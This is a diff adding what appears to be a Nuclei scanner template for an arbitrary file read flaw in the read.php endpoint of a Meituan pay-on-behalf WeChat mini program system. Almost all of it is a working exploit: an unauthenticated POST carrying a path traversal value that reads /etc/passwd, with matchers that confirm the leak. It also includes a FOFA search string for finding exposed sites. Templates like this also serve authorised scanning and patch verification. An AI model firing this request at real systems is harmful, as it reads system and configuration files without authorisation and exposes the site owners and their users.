@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 'root:'
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          name=../../../../../../../../../etc/passwd
+id: meituan-read_php-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/h5/static/js/chunk-vendors.js"
+        美团代付微信小程序系统 read.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 美团代付微信小程序系统 read.php 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489323&idx=1&sn=24db5752b851b66304a8d4032f6c2e8a&chksm=c267a218f5102b0e80b711cbb6413c5d30500639207a9a8c5def3fc8eeb3f45d61ec11c53a91&token=1884652675&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
